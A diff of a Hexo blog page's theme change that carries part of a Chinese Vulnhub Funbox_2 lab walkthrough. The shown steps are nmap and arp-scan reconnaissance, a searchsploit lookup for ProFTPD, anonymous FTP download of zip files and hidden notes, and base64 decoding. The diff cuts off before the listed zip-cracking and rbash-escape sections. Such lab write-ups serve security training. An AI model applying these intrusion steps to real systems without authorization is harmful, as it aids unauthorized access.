@@ -1,23 +1,12 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang=zh>
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width">
-<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.0.0">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/icon_32.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/icon_16.png">
-
-<link rel="stylesheet" href="/css/main.css">
-
-
-
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
-
-<script class="next-config" data-name="main" type="application/json">{"hostname":"hdfzzf.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.9.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
-<meta name="description" content="该靶机难度较简单。">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="该靶机难度较简单。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="28 Vulnhub Funbox_2 Writeup">
 <meta property="og:url" content="https://hdfzzf.github.io/2022/05/08/28%20Vulnhub%20Funbox_2%20Writeup/index.html">
@@ -39,280 +28,158 @@
 <meta property="article:tag" content="zip密码爆破">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508084033.png">
-
-
-<link rel="canonical" href="https://hdfzzf.github.io/2022/05/08/28%20Vulnhub%20Funbox_2%20Writeup/">
-
-
-
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://hdfzzf.github.io/2022/05/08/28%20Vulnhub%20Funbox_2%20Writeup/","path":"2022/05/08/28 Vulnhub Funbox_2 Writeup/","title":"28 Vulnhub Funbox_2 Writeup"}</script>
-
-<script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>28 Vulnhub Funbox_2 Writeup | HDFZZF's BLOG</title>
-  
-
-
-
-
-
-  <noscript>
-    <link rel="stylesheet" href="/css/noscript.css">
-  </noscript>
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
-  <div class="headband"></div>
-  <a target="_blank" rel="noopener" href="https://github.com/hdfzzf" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
-
-  <main class="main">
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏" role="button">
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-    </div>
-  </div>
-
-  <div class="site-meta">
-
-    <a href="/" class="brand" rel="start">
-      <i class="logo-line"></i>
-      <p class="site-title">HDFZZF's BLOG</p>
-      <i class="logo-line"></i>
-    </a>
-  </div>
-
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger">
-        <i class="fa fa-search fa-fw fa-lg"></i>
-    </div>
-  </div>
-</div>
-
-
-
-<nav class="site-nav">
-  <ul class="main-menu menu">
-        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
-        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
-        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
-        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
-      <li class="menu-item menu-item-search">
-        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
-        </a>
-      </li>
-  </ul>
-</nav>
-
-
-
-  <div class="search-pop-overlay">
-    <div class="popup search-popup"><div class="search-header">
-  <span class="search-icon">
-    <i class="fa fa-search"></i>
-  </span>
-  <div class="search-input-container">
-    <input autocomplete="off" autocapitalize="off" maxlength="80"
-           placeholder="搜索..." spellcheck="false"
-           type="search" class="search-input">
-  </div>
-  <span class="popup-btn-close" role="button">
-    <i class="fa fa-times-circle"></i>
-  </span>
-</div>
-<div class="search-result-container no-result">
-  <div class="search-result-icon">
-    <i class="fa fa-spinner fa-pulse fa-5x"></i>
-  </div>
-</div>
-
-    </div>
-  </div>
-
-</div>
-        
-  
-  <div class="toggle sidebar-toggle" role="button">
-    <span class="toggle-line"></span>
-    <span class="toggle-line"></span>
-    <span class="toggle-line"></span>
-  </div>
-
-  <aside class="sidebar">
-
-    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
-      <ul class="sidebar-nav">
-        <li class="sidebar-nav-toc">
-          文章目录
-        </li>
-        <li class="sidebar-nav-overview">
-          站点概览
-        </li>
-      </ul>
-
-      <div class="sidebar-panel-container">
-        <!--noindex-->
-        <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="nav-text">1. 靶机信息</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B8%97%E9%80%8F"><span class="nav-text">2. 渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="nav-text">2.1. 主机发现、端口扫描、端口服务发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#http%E6%9C%8D%E5%8A%A1"><span class="nav-text">2.2. http服务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#get-shell"><span class="nav-text">2.3. get shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-text">2.4. 权限提升</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#rbash%E9%80%83%E9%80%B8"><span class="nav-text">2.4.1. rbash逃逸</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%95%AA%E5%A4%96"><span class="nav-text">2.4.2. 番外</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">3. 总结</span></a></li></ol></div>
-        </div>
-        <!--/noindex-->
-
-        <div class="site-overview-wrap sidebar-panel">
-          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="hdfzzf"
-      src="/images/zzf.jpg">
-  <p class="site-author-name" itemprop="name">hdfzzf</p>
-  <div class="site-description" itemprop="description"></div>
-</div>
-<div class="site-state-wrap site-overview-item animated">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-        <a href="/archives/">
-          <span class="site-state-item-count">121</span>
-          <span class="site-state-item-name">日志</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-categories">
-          <a href="/categories/">
-        <span class="site-state-item-count">13</span>
-        <span class="site-state-item-name">分类</span></a>
-      </div>
-      <div class="site-state-item site-state-tags">
-          <a href="/tags/">
-        <span class="site-state-item-count">194</span>
-        <span class="site-state-item-name">标签</span></a>
-      </div>
-  </nav>
-</div>
-  <div class="links-of-author site-overview-item animated">
-      <span class="links-of-author-item">
-        <a href="https://github.com/hdfzzf" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;hdfzzf" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
-      </span>
-      <span class="links-of-author-item">
-        <a href="mailto:dfhong1998@163.com" title="E-Mail → mailto:dfhong1998@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
-      </span>
-  </div>
-
-
-
-        </div>
-      </div>
-    </div>
-  </aside>
-  <div class="sidebar-dimmer"></div>
-
-
-    </header>
-
     
-  <div class="back-to-top" role="button" aria-label="返回顶部">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-  <div class="reading-progress-bar"></div>
-
-<noscript>
-  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
-</noscript>
-
-
-    <div class="main-inner post posts-expand">
-
-
-  
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://hdfzzf.github.io/2022/05/08/28%20Vulnhub%20Funbox_2%20Writeup/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/zzf.jpg">
-      <meta itemprop="name" content="hdfzzf">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="HDFZZF's BLOG">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          28 Vulnhub Funbox_2 Writeup
-        </h1>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
+    
       
-
-      <time title="创建时间：2022-05-08 00:00 / 修改时间：10:52" itemprop="dateCreated datePublished" datetime="2022-05-08T00:00:00+08:00">2022-05-08</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">内网渗透</span></a>
-        </span>
-    </span>
-
-  
-    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
-      <span class="post-meta-item-icon">
-        <i class="fa fa-eye"></i>
-      </span>
-      <span class="post-meta-item-text">阅读次数：</span>
-      <span id="busuanzi_value_page_pv"></span>
-    </span>
-  
-  <span class="post-meta-item">
+        
+          <link rel="shortcut icon" href="/images/LOGO.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
     
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus：</span>
+    <!-- title -->
+    <title>28 Vulnhub Funbox_2 Writeup</title>
+    <!-- styles -->
     
-    <a title="disqus" href="/2022/05/08/28%20Vulnhub%20Funbox_2%20Writeup/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2022/05/08/28 Vulnhub Funbox_2 Writeup/" itemprop="commentCount"></span>
-    </a>
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="القائمة"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="القائمة"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="الأعلى" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2022/05/08/27%20Vulnhub%20Tre%20Writeup/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/05/08/29%20Vulnhub%20Dawn%20Writeup%20%E2%AD%90/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2022/05/08/28%20Vulnhub%20Funbox_2%20Writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2022/05/08/28%20Vulnhub%20Funbox_2%20Writeup/&text=28 Vulnhub Funbox_2 Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2022/05/08/28%20Vulnhub%20Funbox_2%20Writeup/&title=28 Vulnhub Funbox_2 Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2022/05/08/28%20Vulnhub%20Funbox_2%20Writeup/&is_video=false&description=28 Vulnhub Funbox_2 Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=28 Vulnhub Funbox_2 Writeup&body=Check out this article: https://hdfzzf.github.io/2022/05/08/28%20Vulnhub%20Funbox_2%20Writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2022/05/08/28%20Vulnhub%20Funbox_2%20Writeup/&title=28 Vulnhub Funbox_2 Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/05/08/28%20Vulnhub%20Funbox_2%20Writeup/&title=28 Vulnhub Funbox_2 Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/05/08/28%20Vulnhub%20Funbox_2%20Writeup/&title=28 Vulnhub Funbox_2 Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/05/08/28%20Vulnhub%20Funbox_2%20Writeup/&title=28 Vulnhub Funbox_2 Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/05/08/28%20Vulnhub%20Funbox_2%20Writeup/&name=28 Vulnhub Funbox_2 Writeup&description=&lt;p&gt;该靶机难度较简单。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/05/08/28%20Vulnhub%20Funbox_2%20Writeup/&t=28 Vulnhub Funbox_2 Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1. 靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">2. 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">2.1. 主机发现、端口扫描、端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#http%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.2.</span> <span class="toc-text">2.2. http服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-shell"><span class="toc-number">2.3.</span> <span class="toc-text">2.3. get shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">2.4.</span> <span class="toc-text">2.4. 权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#rbash%E9%80%83%E9%80%B8"><span class="toc-number">2.4.1.</span> <span class="toc-text">2.4.1. rbash逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%95%AA%E5%A4%96"><span class="toc-number">2.4.2.</span> <span class="toc-text">2.4.2. 番外</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">3. 总结</span></a></li></ol>
+    </div>
   </span>
-  
-  
-    <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>3.6k</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>3 分钟</span>
-    </span>
 </div>
 
-        </div>
-      </header>
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        28 Vulnhub Funbox_2 Writeup
+    </h1>
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-        <p>该靶机难度较简单。</p>
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">hdfzzf</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-05-07T16:00:00.000Z" itemprop="datePublished">2022-05-08</time>
+        
+        (Updated: <time datetime="2022-05-08T02:52:12.922Z" itemprop="dateModified">2022-05-08</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/rbash%E9%80%83%E9%80%B8/" rel="tag">rbash逃逸</a>, <a class="tag-link-link" href="/tags/vulnhub/" rel="tag">vulnhub</a>, <a class="tag-link-link" href="/tags/zip%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/" rel="tag">zip密码爆破</a>, <a class="tag-link-link" href="/tags/%E7%BB%BC%E5%90%88/" rel="tag">综合</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>该靶机难度较简单。</p>
 <span id="more"></span>
 <h1 id="靶机信息">1. 靶机信息</h1>
 <p>靶机地址：</p>
@@ -340,150 +207,286 @@
 </ul>
 <h1 id="渗透">2. 渗透</h1>
 <h2 id="主机发现端口扫描端口服务发现">2.1. 主机发现、端口扫描、端口服务发现</h2>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.32</span><br><span class="line">sudo nmap -p21,22,80 -A 10.0.2.32</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> arp-scan -l
+<span class="token function">sudo</span> nmap -p- <span class="token number">10.0</span>.2.32
+<span class="token function">sudo</span> nmap -p21,22,80 -A <span class="token number">10.0</span>.2.32<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508084033.png" /></p>
 <h2 id="http服务">2.2. http服务</h2>
 <p>根据扫描的结果，靶机的80端口上存在着robots.txt，里面泄露了一个目录/logs/，但是靶机并没有该目录。</p>
 <p>路径扫描也没有任何有用的信息。看来突破点应该在ftp上。</p>
 <h2 id="get-shell">2.3. get shell</h2>
-<p>ftp服务的版本是proftp 1.3.5e，搜索是否存在exploit <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit proftp 1.3.5</span><br></pre></td></tr></table></figure></p>
+<p>ftp服务的版本是proftp 1.3.5e，搜索是否存在exploit <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit proftp <span class="token number">1.3</span>.5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508105057.png" /></p>
 <p>虽然显示3个，但是其实针对的都是同一个漏洞。经测试，都无法成功，可能是因为靶机是1.3.5e，还是与1.3.5有所差别。</p>
-<p>frp服务可以匿名登录，从扫描结果来看，存在着许多zip文件，将所有内容全部下载到kali，然后尝试解压。 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. ftp 10.0.2.32 21</span><br><span class="line">2. username: anonymous, password: 直接enter</span><br><span class="line">3. mget *  <span class="comment"># 下载所有文件</span></span><br><span class="line">4. get .@users  <span class="comment"># 下载隐藏文件</span></span><br><span class="line">5. get .@admins <span class="comment"># 下载隐藏文件</span></span><br></pre></td></tr></table></figure></p>
-<p>首先查看welcome.msg, .@users, .@admins <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">┌──(m1ku㉿kali)-[~/funbox2]</span><br><span class="line">└─$ cat welcome.msg                                                                                                                                               82 ⨯</span><br><span class="line">Welcome, archive user %U@%R !</span><br><span class="line"></span><br><span class="line">The <span class="built_in">local</span> time is: %T</span><br><span class="line"></span><br><span class="line">This is an experimental FTP server.  If you have any unusual problems,</span><br><span class="line">please report them via e-mail to &lt;root@%L&gt;.</span><br><span class="line"></span><br><span class="line">┌──(m1ku㉿kali)-[~/funbox2]</span><br><span class="line">└─$ cat .@users                                                                                                                                                    1 ⨯</span><br><span class="line">Hi Users,</span><br><span class="line"></span><br><span class="line">be carefull with your keys. Find them <span class="keyword">in</span> %yourname%.zip.</span><br><span class="line">The passwords are the old ones.</span><br><span class="line"></span><br><span class="line">Regards</span><br><span class="line">root</span><br><span class="line"></span><br><span class="line">┌──(m1ku㉿kali)-[~/funbox2]</span><br><span class="line">└─$ cat .@admins        </span><br><span class="line">SGkgQWRtaW5zLAoKYmUgY2FyZWZ1bGwgd2l0aCB5b3VyIGtleXMuIEZpbmQgdGhlbSBpbiAleW91cm5hbWUlLnppcC4KVGhlIHBhc3N3b3JkcyBhcmUgdGhlIG9sZCBvbmVzLgoKUmVnYXJkcwpyb290</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(m1ku㉿kali)-[~/funbox2]</span><br><span class="line">└─$ <span class="built_in">echo</span> -n <span class="string">&quot;SGkgQWRtaW5zLAoKYmUgY2FyZWZ1bGwgd2l0aCB5b3VyIGtleXMuIEZpbmQgdGhlbSBpbiAleW91cm5hbWUlLnppcC4KVGhlIHBhc3N3b3JkcyBhcmUgdGhlIG9sZCBvbmVzLgoKUmVnYXJkcwpyb290&quot;</span>|base64 -d</span><br><span class="line">Hi Admins,</span><br><span class="line"></span><br><span class="line">be carefull with your keys. Find them <span class="keyword">in</span> %yourname%.zip.</span><br><span class="line">The passwords are the old ones.</span><br><span class="line"></span><br><span class="line">Regards</span><br><span class="line">root</span><br></pre></td></tr></table></figure></p>
+<p>frp服务可以匿名登录，从扫描结果来看，存在着许多zip文件，将所有内容全部下载到kali，然后尝试解压。 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>. <span class="token function">ftp</span> <span class="token number">10.0</span>.2.32 <span class="token number">21</span>
+<span class="token number">2</span>. username: anonymous, password: 直接enter
+<span class="token number">3</span>. mget *  <span class="token comment"># 下载所有文件</span>
